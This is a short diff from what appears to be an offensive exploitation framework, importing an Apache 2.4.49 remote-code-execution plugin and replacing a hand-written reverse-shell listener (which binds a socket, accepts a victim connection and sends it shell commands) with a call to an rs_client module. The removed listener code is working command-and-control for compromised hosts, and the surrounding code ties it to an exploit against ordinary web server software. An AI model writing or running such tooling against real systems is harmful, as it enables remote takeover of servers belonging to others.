@@ -4,40 +4,14 @@ from time import sleep
 import recon
 import socket
 from multiprocessing import Process
+import rs_client
+import sys
 import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE
 
 
 def listener():
-    s = socket.socket()
-    s.bind((LOCAL_ADDRESS, LOCAL_PORT))
-    print('[+] Listening on {}:{}'.format(LOCAL_ADDRESS, LOCAL_PORT))
-    s.listen()
-    client_socket, client_address = s.accept()
-    print('[+] {}:{} connected'.format(client_address[0], client_address[1]))
-    # receiving the current working directory of the client
-    cwd = client_socket.recv(BUFFER_SIZE).decode()
-    print("[+] Current working directory:", cwd)
-
-    while True:
-        # get the command from prompt
-        pwd = "{} $> ".format(cwd)
-        print(pwd, end='')
-        command = 'echo $PATH > /tmp/toto'
-        
-        #if not command.strip():
-            # empty command
-            #continue
-        # send the command to the client
-        client_socket.send(command.encode())
-        #if command.lower() == "exit":
-            # if the command is exit, just break out of the loop
-            #break
-        # retrieve command results
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        # split command output and current directory
-        #results, cwd = output.split(SEPARATOR)
-        # print output
-        print(output)
+    sys.stdin = open(0)
+    rs_client.main(LOCAL_PORT, LOCAL_ADDRESS)
 
 def exploit():
     sleep(3)
